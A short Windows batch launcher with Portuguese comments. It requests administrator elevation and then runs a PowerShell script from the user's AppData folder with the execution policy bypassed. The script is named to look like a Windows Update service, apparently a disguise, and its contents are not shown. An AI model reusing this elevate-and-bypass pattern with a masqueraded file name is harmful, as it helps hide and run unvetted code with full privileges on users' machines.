@echo off
:: Verifica se já está executando como admin
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Solicitando permissão de administrador...
    powershell -Command "Start-Process -FilePath '%~f0' -Verb runAs"
    exit /b
)

:: Caminho completo do seu script PowerShell (altere conforme seu local)
set SCRIPT_PATH=%APPDATA%\Microsoft\Windows\WindowsUpdateService.ps1

:: Executa o script PowerShell elevado e com bypass da política de execução
powershell -NoExit -ExecutionPolicy Bypass -File "%SCRIPT_PATH%"
